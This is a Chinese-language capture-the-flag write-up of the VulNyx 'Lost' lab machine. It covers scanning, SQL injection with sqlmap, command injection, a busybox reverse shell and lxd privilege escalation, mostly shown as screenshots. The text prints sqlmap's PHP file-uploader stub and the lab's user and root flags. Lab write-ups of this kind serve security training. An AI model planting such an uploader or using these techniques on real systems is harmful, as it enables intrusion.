---
title: VulNyx Lost靶机复盘
author: LingMj
data: 2025-01-19
categories: [VulNyx]
tags: [sqlmap,shell,tunnel,ping,lxd]
description: 难度-Hard
---

## 网段扫描
```
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:df:e2:a7, IPv4: 192.168.26.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.26.1    00:50:56:c0:00:08       VMware, Inc.
192.168.26.2    00:50:56:e8:d4:e1       VMware, Inc.
192.168.26.175  00:0c:29:e7:47:61       VMware, Inc.
192.168.26.254  00:50:56:ff:4b:3d       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.273 seconds (112.63 hosts/sec). 4 responded
```

## 端口扫描

```
└─# nmap -p- -sC -sV 192.168.26.175
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-18 21:41 EST
Nmap scan report for 192.168.26.175 (192.168.26.175)
Host is up (0.0020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 65:bb:ae:ef:71:d4:b5:c5:8f:e7:ee:dc:0b:27:46:c2 (ECDSA)
|_  256 ea:c8:da:c8:92:71:d8:8e:08:47:c0:66:e0:57:46:49 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: lost.nyx
MAC Address: 00:0C:29:E7:47:61 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

## 获取Webshell

>发现存在lost.nyx，去web上看一眼
>

![图 2](../assets/images/0ee40669d1622a6bd13cab2695d097ef24b6f99a6ec7e33e4c1650ec3ecdec2f.png)  
![图 0](../assets/images/f0f65f83455a7812505b63faf2475ba98c8fea90659665fff6a0cd5269ade5c1.png)  
![图 3](../assets/images/4b66830a82201e5b59cd8b50a302102a95c5979b18e77aafdeb166f01825d412.png)  

>存在提示，wfuzz子域名
>
![图 4](../assets/images/1ddfa927866de1a1d6ceee1862d261818234f4dd50f36dcff2ac3e2c7ddfd31c.png)  
![图 5](../assets/images/44efea9269522dbc9d9aef50ed09fbcde92ce3824f7177fb4adc0ec3813499e6.png)  
![图 6](../assets/images/ca155e0f52cbbc2cf44faf5649b15d01861f29792b438223907c7ad1e842f855.png)  

>感觉可以查看是否有LFI，先等一下扫目录
>
![图 7](../assets/images/5df48acb322cf23ac3637630af9df52fda81b48badebe66e54097f43e4391740.png)  
![图 8](../assets/images/448eba0a10c7a07eef884bc0f901008982b76872c572b09da8c0338d76cc6116.png)  
![图 9](../assets/images/e9600dabfd9139dc8dcea4fc6a1c67120c16a8cd83fc0f0f414ead197cfa1d9b.png)  

>大概率存在sql注入，利用salmap走一下
>
![图 10](../assets/images/5cf77132e4c875377b0a22b1bb4bdd67cb896a8f6ca20318f630a468148bb765.png)  
![图 11](../assets/images/6b54ce69a91be8785d7811c0f0eae6c0b77dd409e4104be7c6593467b38a390a.png)  
![图 12](../assets/images/dde7f74feccd13484df51f7088f710c7b9d3a0a802912c1c1bec9335636ffbae.png)  

>没爆破什么有用的信息，尝试进行找其他方式获取shell
>
![图 14](../assets/images/9fd558c7d97256d56704e6c83e2fb30c060ae3fb02fb0b4208538d35658105a8.png)  

![图 13](../assets/images/ba83bd423d0b91ebddf30fdce6322076bf6116ce1794adc064ff57d1104b549f.png)  
![图 15](../assets/images/5a3824b6cab00c1f3d43f80d494c5ecc9399261c818a12d7a2b8d5c1259881da.png)  

>闲来无事，找一下发现sqlmap可以进行shell命令注入
>
![图 18](../assets/images/defec4d2d2a0ebaa93f4777a21c3ac9e9130289e7e1a687b40693a87615422ee.png)  

![图 16](../assets/images/06d5242bc516b9a620865c6cfefe7f86920cdacc606d10a14ad070339407d050.png)  

## 提权

```
www-data@lost:/var/www/lost$ ls
about.html  assets  index.html  passengers.php  team.html  tmpuoqej.php  vendor
www-data@lost:/var/www/lost$ sudo -l
bash: sudo: command not found
www-data@lost:/var/www/lost$ cat tmpuoqej.php 
Kate    Austen  Los Angeles     Tracker<?php
if (isset($_REQUEST["upload"])){$dir=$_REQUEST["uploadDir"];if (phpversion()<'4.1.0'){$file=$HTTP_POST_FILES["file"]["name"];@move_uploaded_file($HTTP_POST_FILES["file"]["tmp_name"],$dir."/".$file) or die();}else{$file=$_FILES["file"]["name"];@move_uploaded_file($_FILES["file"]["tmp_name"],$dir."/".$file) or die();}@chmod($dir."/".$file,0755);echo "File uploaded";}else {echo "<form action=".$_SERVER["PHP_SELF"]." method=POST enctype=multipart/form-data><input type=hidden name=MAX_FILE_SIZE value=1000000000><b>sqlmap file uploader</b><br><input name=file type=file><br>to directory: <input type=text name=uploadDir value=/var/www/lost/> <input type=submit name=upload value=upload></form>";}?>
www-data@lost:/var/www/lost$ cd ..
www-data@lost:/var/www$ ls
html  lost
www-data@lost:/var/www$ cd html/
www-data@lost:/var/www/html$ ls a-l
ls: cannot access 'a-l': No such file or directory
www-data@lost:/var/www/html$ ls -al
total 16
drwxrwxrwt 3 www-data www-data 4096 Feb 21  2024 .
drwxr-xr-x 4 root     root     4096 Feb 21  2024 ..
drwxr-xr-x 3 root     root     4096 Feb 21  2024 assets
-rw-r--r-- 1 root     root      819 Feb 21  2024 index.html
www-data@lost:/var/www/html$ cd /opt/
www-data@lost:/opt$ ls -al
total 12
drwxr-xr-x  3 root root 4096 Feb 21  2024 .
drwxr-xr-x 19 root root 4096 Feb 20  2024 ..
drwxr-xr-x  2 root root 4096 Feb 21  2024 pinged
```

>这个文件应该是提权关键
>
![图 19](../assets/images/4ab20f932478829e093f290b90ffc2bc31c33fdfef1f9a71e7231aa85962793d.png)  
![图 20](../assets/images/4cf5f9f1a7a395fd03bdd5fd5bc7c3feaaadd47857fd96573f94484f90847615.png)  

>利用一下脚本吧，发现有点难找东西
>
![图 21](../assets/images/4a165430fc53d48a691daf2cdf2a2960640ed75ac37c04d29c8f5b4f4e3bb23a.png)  
![图 22](../assets/images/a51c5e45536b9a191baec213e23b222f016421cb15050fef9e54dc9e76fb2478.png)  
![图 23](../assets/images/8ace48cff5bf617c6beee500abe92935f9485f2df231a1a737052056d43eba39.png)  

>利用端口转发，看看是什么东西
>
![图 24](../assets/images/5730ec17e12435c2db37bf9afd4954c150b2ec9e98f894593b588407e9e6bd4a.png)  
![图 25](../assets/images/50d78d9cef9b50f545b1b003b59c60d35e3db5e2a13ef061e3c8ef3af9685af4.png)  
![图 26](../assets/images/1857b0a50437cea120138e0563b0b620032a4e053ed6e81858816b055f3d594d.png)  
![图 27](../assets/images/a773b4008755ad1691cc7824bdd05e185d82b5ac1b48d63c67714ab301d1a639.png)  
![图 28](../assets/images/625b53ea30f99fbaffbda68d6719c314bd393c87c9787028f72771c04e107271.png)  

>现在在opt目录下
>

![图 29](../assets/images/95b7888803d26e5e724a9087be2806842b83f3d0de7a68ef59abdc0f5d1fa1b5.png)  

>不能操作，可以看看他里面是什么
>
![图 30](../assets/images/d4e6262c3565e36edf762821840dc69efee0d6ec6320af52f47ceff13c7650a9.png)  

>这里测试不能使用空格，不过￥{IFS}可以解决这个问题
>
![图 31](../assets/images/fa705c9a911d50c6a81509dfa755df08b41d6fa81cdb64d3314eb31459176f3f.png)  
![图 32](../assets/images/90f6d280d89aa26cfbff2a7d4868d85c523fca1513b0852d36ed6eff18ba7601.png)  

>禁掉了挺多东西，继续busybox弹shell
>
![图 33](../assets/images/1d92ccd31dcda9e8aee1333b7c2dde9375b52b99af61ac0a9d77a5bfe2119b1b.png)  
![图 34](../assets/images/48aad6dfda34ccd4137ada00e9b8246db562339ba89c0c4cc69374a1310f1597.png)  

>继续提权，还是需要找文件
>
![图 35](../assets/images/6aac0193c4a97f1db7759143ada8479a189802160ace95cebe23afede79012be.png)  

>不知道能否利用这个lxc,查一下资料
>
![图 36](../assets/images/2800fa54005b18886712d58e648d473e2258e1fc1e4bc25202d05923ba7f5a26.png)  

![图 37](../assets/images/f066b158c3360b08e7e04abba0dc8e3353f91c301ba13e63208c1ef5c8b40df5.png)  

![图 38](../assets/images/dea6d899cd15482a2d5bcabf34012208bf43d282b571a6ba179826107d50ff47.png)  

>ok明白了
>
![图 39](../assets/images/14b677736a842780e3a0faa0bbbe77753695e93428d574a0744924c35aba6f64.png)  
![图 40](../assets/images/1e104a40ee2ea5b8ff2ebd298d566f67b1ecf5e4ecb6f523c06b0f995d338d20.png)  
![图 41](../assets/images/9cbc79f0674a0e5582d64a1a09d7318c189912a9698a51de23bf95e85cbd4e7f.png)  
![图 42](../assets/images/c7eeb06a5894f982da5bbd6359b4524b1d9e9d9f761b34abcff263f752a87a69.png)  
![图 43](../assets/images/d38fe00296fda1521fadedbfc6395a03c91d64bed74d7615c985245b43e30367.png)  
![图 44](../assets/images/a8876a15678758c8c38cf6f67a982915c1da45a8ebb7350384489590f30f02b7.png)  
![图 45](../assets/images/7a963a2055847e8ae645e770854aafc6fcce52be21f9ec58474c3517a8d8da9b.png)  
![图 46](../assets/images/12ab6ec5a2c3dccde44cd379e52e501a0a57e89b6aacaea521368b5f68332896.png)  

>晕了，查一伙资料了
>
![图 47](../assets/images/e5cccf9df9c6ee2ae275ee4ea6a2c4562535a8a72417a0e48adf13f7040ef12f.png)  

>image的名称很重要上面的名称都是不是image对应失败了不能直接复制粘贴例子代码
>

![图 48](../assets/images/5ed8c692b9f718ee58a7dbedc8e65f649b02f48aee362fc92655b21ce3324e6a.png)  

>到这里靶场复盘结束
>
>userflag:df5ea29924d39c3be8785734f13169c6
>
>rootflag:74cc1c60799e0a786ac7094b532f01b1
>

















